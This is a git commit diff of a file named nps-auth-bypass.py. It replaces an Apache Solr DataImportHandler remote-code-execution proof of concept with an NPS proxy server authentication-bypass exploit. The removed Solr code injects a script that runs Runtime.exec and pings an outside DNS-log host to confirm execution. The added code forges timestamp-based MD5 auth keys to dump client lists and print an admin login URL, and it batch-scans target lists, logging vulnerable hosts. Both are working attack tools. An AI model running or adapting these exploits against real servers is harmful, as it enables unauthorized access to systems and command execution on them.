1e572153f112b0bff03361c929ed19e508da0cbf
myh0st <1293348082@qq.com>
2023-06-17 08:54:10 +0800

    Update nps-auth-bypass.py

--- nps-auth-bypass.py
+++ nps-auth-bypass.py
@@ -1,89 +1,85 @@
-import requests
-import json
+#!/usr/bin/env python3
+# -*- encoding: utf-8 -*-
+"""
+@File    :   nps-auth-bypass.py
+@Time    :   2022/07/28 14:18:32
+@Author  :   _0xf4n9x_
+@Version :   1.0
+@Contact :   fanq.xu@gmail.com
+@Desc    :   NPS Proxy Server Auth Bypass Vuln
+"""
+
+
+import os
 import sys
-import base64
-import warnings
-
-warnings.filterwarnings("ignore")
-
-comheaders = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
-}
-
-def admin_cores(url, cmd):
-    core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
-    r = requests.get(url=core_selector_url, headers=comheaders, verify=False)
-    json_strs = json.loads(r.text)
-    if r.status_code ==200 and "responseHeader" in r.text:
-        print( "\nHere Have %s Core_name Exit!\n" % str(len(json_strs['status'])))
-        for core_selector in json_strs['status']:
-            jas502n_Core_Name = json_strs['status']['%s'%core_selector]['name']
-            print( '\n>>>>The Core Name = %s' % jas502n_Core_Name)
-            show_config(url,jas502n_Core_Name)
-            get_config_name(url,jas502n_Core_Name)
-            URLDataSource_Poc(url,jas502n_Core_Name,cmd)
-    else:
-        print( "No core_selector Exit!")
-    
+import time
+import hashlib
+import argparse
+import requests
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 
-        
-def show_config(url,jas502n_Core_Name):
-    config_url = url + "/solr/"+ jas502n_Core_Name +"/dataimport?_=1565530241159&command=show-config&indent=on&wt=json"
-    r1 = requests.get(config_url, headers=comheaders, verify=False)
-    
-    if r1.status_code ==200 and 'dataConfig' in r1.text:
-        print( ">> config_url= %s"% config_url)
-        print( ">%s dataConfig Exit!" % jas502n_Core_Name)
-    else:
-        print( "dataConfig No Exit!")
+def proxy():
+    proxy = None
+    # proxy = {
+    #     'http': 'http://127.0.0.1:8080',
+    #     'https': 'http://127.0.0.1:8080',}
+    return proxy
 
+def gen_authkey(time=int(time.time())):
+    mdf = hashlib.md5()
+    mdf.update(str(time).encode("utf8"))
+    auth_key = mdf.hexdigest()
+    return auth_key
 
-
-def get_config_name(url,jas502n_Core_Name):
-    get_config_url = url + '/solr/'+ jas502n_Core_Name +'/dataimport?_=1565530241159&command=status&indent=on&wt=json'
-    r2 = requests.get(get_config_url, headers=comheaders, verify=False)
-    if r2.status_code ==200 and 'config' in r2.text:
-        print( ">> get_config_url= %s" % get_config_url)
-        r2_json = json.loads(r2.text)
-        r2_str = r2_json['initArgs']
-        
-        print( '>get_config_name= %s' % r2_str[1][1])
-        
-    else:
-        print( "Core Config Name No Exit!")
-
-
-
-def URLDataSource_Poc(url,jas502n_Core_Name,cmd):
-    debug_model_url = url + '/solr/'+ jas502n_Core_Name +'/dataimport?_=1565530241159&indent=on&wt=json'
-    payload = "command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&dataConfig=%%3CdataConfig%%3E%%0A++%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++function+poc()%%7B+java.lang.Runtime.getRuntime().exec(%%22%s%%22)%%3B%%0A++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cdocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A++++++++++++url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2Ffeeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPathEntityProcessor%%22%%0A++++++++++++forEach%%3D%%22%%2Ffeed%%22%%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&name=dataimport" % cmd
-    headers = {
-    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
-    "Accept": "application/json, text/plain, */*",
-    "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
-    "Accept-Encoding":"gzip, deflate",
-    "Content-type":"application/x-www-form-urlencoded",
-    "X-Requested-With":"XMLHttpRequest",
-    "Referer":"http://%s/solr/" % url
-
-    }
-    r3 = requests.post(url = debug_model_url, data=payload,headers=headers, verify=False)
-    print( ">>>>> debug_model_url= %s" % debug_model_url)
-    if r3.status_code ==200 and 'Requests' in r3.text:
-
-        print( "Send Poc Success!")
-    else:
-        print( "No Send Poc Success!")
-        print( r3.text)
-
+def poc(rooturl):
+    headers = {"Content-Type": "application/x-www-form-urlencoded", 
+               "X-Requested-With": "XMLHttpRequest", 
+               "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36"}
+    now = int(time.time())
+    payload = "search=&order=asc&offset=0&limit=10&auth_key=" + gen_authkey(now) + "&timestamp=" + str(now) + "&offset=0&limit=10&search="
+    try:
+        res = requests.post(rooturl+'/index/hostlist', headers=headers, data=payload, proxies=proxy(), timeout=15, verify=False)
+        if (res.status_code == 200) and ('"rows":' in res.text and 'total":' in res.text):
+            print("[+] {} is vulnerable!!!".format(rooturl))
+            print("[+] Client List: ", res.text)
+            return True
+        else:
+            print("[-] {} is not vulnerable.".format(rooturl))
+            return False, ""
+    except Exception as e:
+        print("[-] {} Exception: ".format(rooturl) + e)
+        pass
+    return False
 
 
 if __name__ == '__main__':
-    url = sys.argv[1]
-    dnslog = "c87a1e49.dns.dnsmap.org."
-    print("[+]Dnslog: ", dnslog)
-    hostname = url.split("/")[2].split(".")[0]
-    cmd = "ping " + hostname +  "." + dnslog
-    print("[+]Commond: ", cmd)
-    admin_cores(url, cmd)
+    parser = argparse.ArgumentParser(
+        description="NPS Proxy Server Auth Bypass Vulnerability Scanner")
+    parser.add_argument('-u', '--url', type=str,
+                        help="vulnerability verification for individual websites")
+    parser.add_argument('-f', '--file', type=str,
+                        help="perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file")
+    args = parser.parse_args()
+
+    if len(sys.argv) == 3:
+        if sys.argv[1] in ['-u', '--url']:
+            rooturl = requests.utils.urlparse(args.url).scheme + "://" + requests.utils.urlparse(args.url).netloc
+            if poc(rooturl) == True:
+                now = int(time.time())
+                uri = "/Index/Index?auth_key=%s&timestamp=%s" % (gen_authkey(now) , now)
+                print("[+] Please Open This URL: {}{} ".format(rooturl,uri))
+            else:
+                sys.exit(0)
+        elif sys.argv[1] in ['-f', '--file']:
+            if os.path.isfile(args.file) == True:
+                with open(args.file) as target:
+                    urls = []
+                    urls = target.read().splitlines()
+                    for url in urls:
+                        rooturl = requests.utils.urlparse(url).scheme + "://" + requests.utils.urlparse(url).netloc
+                        if poc(rooturl) == True:
+                            with open("success.txt", "a+") as f:
+                                f.write(url + "\n")
+    else:
+        parser.print_help()
